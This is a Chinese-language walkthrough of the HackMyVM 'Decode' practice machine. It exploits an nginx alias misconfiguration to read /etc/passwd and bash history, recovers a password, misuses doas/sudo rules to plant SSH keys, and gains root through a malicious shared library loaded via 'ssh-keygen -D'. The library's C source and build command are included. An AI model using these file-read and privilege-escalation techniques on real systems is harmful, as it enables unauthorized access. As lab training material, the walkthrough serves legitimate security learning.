---
{"dg-publish":true,"title":"hackmyvm_Decode","dg-path":"安全/靶机/hackmyvm_Decode.md","permalink":"/安全/靶机/hackmyvm_Decode/","dgPassFrontmatter":true}
---

# 主机发现

![Pasted image 20250128224741.png](/img/user/picture/Pasted%20image%2020250128224741.png)
两个端口服务显示`tcpwrapped`,应该是被防火墙拦了（或者是其他原因）

单独扫一下就出来了，可能是速率设置太高了？
![Pasted image 20250128225027.png](/img/user/picture/Pasted%20image%2020250128225027.png)
![Pasted image 20250128225304.png](/img/user/picture/Pasted%20image%2020250128225304.png)


# WEB渗透
主页没什么信息
![Pasted image 20250128225409.png](/img/user/picture/Pasted%20image%2020250128225409.png)

进行简单的目录扫描
```shell
sudo dirb http://192.168.124.14/
```
![Pasted image 20250128230152.png](/img/user/picture/Pasted%20image%2020250128230152.png)
`/robots.txt`
![Pasted image 20250128230218.png](/img/user/picture/Pasted%20image%2020250128230218.png)
里面有很多路径，但是有一些像是系统的路径而不是网页路径？

首先看一下`/decode/`,因为靶机就是交这个名字麻
![Pasted image 20250128230358.png](/img/user/picture/Pasted%20image%2020250128230358.png)
发现和主页很像，但是下面多了一个时间？
或许这个页面有一些隐藏参数？（我没测，因为发现了更有趣的）
![Pasted image 20250128230610.png](/img/user/picture/Pasted%20image%2020250128230610.png)
当我访问第一个的时候
![Pasted image 20250128230653.png](/img/user/picture/Pasted%20image%2020250128230653.png)
竟然能下载，所以我们就可以尝试一下`passwd`
因为passwd和crontab是在一个目录下
结果确实也可下载
![Pasted image 20250128230813.png](/img/user/picture/Pasted%20image%2020250128230813.png)
注意到有三个用户，其中有一个用户甚至给了加密密码
（这里要注意一下steve这个用户目录是`/usr/share`）
尝试破解：
好吧应该是爆破不出来


现在我们知道`/decode`目录应该是`/etc`这个目录，但是能不能返回上一目录呢
但其实我在这里就卡住了，看了看大佬的WP，知道确实可以返回去的
![Pasted image 20250128234204.png](/img/user/picture/Pasted%20image%2020250128234204.png)
可以看一下nginx的配置文件
```shell
curl http://192.168.124.14/decode/nginx/sites-enabled/default
```
是设置了一个别名
![Pasted image 20250129141423.png](/img/user/picture/Pasted%20image%2020250129141423.png)

`/decode`->`/etc/`
注意到前面少一个`/`



现在我们知道有三个用户，可以尝试读取一下敏感文件
```
steve
decoder
ajneya
```
![Pasted image 20250128234429.png](/img/user/picture/Pasted%20image%2020250128234429.png)
其余两个用户没有
![Pasted image 20250128234511.png](/img/user/picture/Pasted%20image%2020250128234511.png)


终于找到了关键信息：
![Pasted image 20250128234558.png](/img/user/picture/Pasted%20image%2020250128234558.png)

![Pasted image 20250128235050.png](/img/user/picture/Pasted%20image%2020250128235050.png)

手动解码一下：
```shell
openssl req -in example.csr -noout -text
```

```txt
Certificate Request:
    Data:
        Version: 1 (0x0)
        Subject: CN = HackMyVM, ST = decode, L = decode, O = HackMyVM
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:d9:d2:1b:db:c4:10:63:d1:80:30:3f:71:3e:8d:...
                    (省略部分，实际有更多内容)
                Exponent: 65537 (0x10001)
        Attributes:
            challengePassword        :i4mD3c0d3r
            Requested Extensions:
                X509v3 Key Usage: critical
                    Digital Signature, Key Encipherment
                X509v3 Extended Key Usage: critical
                    TLS Web Server Authentication, TLS Web Client Authentication
                X509v3 Subject Alternative Name:
                    DNS:hackmyvm.eu
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        3b:bd:d6:de:94:cc:a9:29:b6:03:7e:ef:7a:9b:91:e0:...
        (省略部分，实际有更多内容)
```
![Pasted image 20250129000316.png](/img/user/picture/Pasted%20image%2020250129000316.png)

这有一个密码`i4mD3c0d3r`,说实话不是很懂，但是是用户`steve`的密码。。。不懂
![Pasted image 20250129000422.png](/img/user/picture/Pasted%20image%2020250129000422.png)





# 提权-ajneya
![Pasted image 20250129000916.png](/img/user/picture/Pasted%20image%2020250129000916.png)
可以用decoder的身份运行，尝试了一下未果

用脚本跑了一下发现下面信息
![Pasted image 20250129113011.png](/img/user/picture/Pasted%20image%2020250129113011.png)
![Pasted image 20250129113147.png](/img/user/picture/Pasted%20image%2020250129113147.png)
看大佬的方法是将公钥cp到ajneya用户中的`.ssh/authorized_keys`中

![Pasted image 20250129114745.png](/img/user/picture/Pasted%20image%2020250129114745.png)
没有公钥的话可以先在攻击机上生成一下
```shell
ssh-keygen -t rsa -b 4096 -C "your_email@example.com"
```

在靶机的/tmp目录中创建好cp过去就行了
```shell
doas -u ajneya cp -a /tmp/.ssh ./
```

![Pasted image 20250129114938.png](/img/user/picture/Pasted%20image%2020250129114938.png)


# 提权root

![Pasted image 20250129121648.png](/img/user/picture/Pasted%20image%2020250129121648.png)

我们可以用root身份执行下面命令
```shell
/usr/bin/ssh-keygen * /opt/*
```

![Pasted image 20250129121728.png](/img/user/picture/Pasted%20image%2020250129121728.png)
可以通过优先加载一个恶意库来实现提权
`pe.c`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

```shell
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
会生成一个恶意库`pe.so`


所以我们要运行的就是
```
sudo /usr/bin/ssh-keygen -D /opt/*/pe.so
```
现在主要问题就是opt目录下我们不可写

但是我们注意到
![Pasted image 20250129122148.png](/img/user/picture/Pasted%20image%2020250129122148.png)
这下面有一个decode目录
而`steve`可以用decode权限
![Pasted image 20250129122258.png](/img/user/picture/Pasted%20image%2020250129122258.png)

```shell
steve@decode:/tmp$cat pe.so | sudo -u decoder  /usr/bin/tee /opt/decode/pe.so
```

![Pasted image 20250129122509.png](/img/user/picture/Pasted%20image%2020250129122509.png)
成功




# 思路梳理

首先通过目录扫描发现web中目录`/decode`是连接到了服务器的`/etc/`，进而读到了passwd等文件
通过进一步测试或者通过获取nginx配置文件，发现漏洞，可以读到服务器是任意路径文件
从而在`steve`用户路径下读到bash_history，获取到可疑文件
从这个文件中获取到密码

现在获取到steve用户权限，通过脚本扫描发现具有`decoder`的tee权限、`ajneya`的cp权限
通过cp在ajneya目录中上传ssh公钥获取到其权限

ajneya具有root的`/usr/bin/ssh-keygen * /opt/*`权限
在结合steve的sudo权限进行提权





























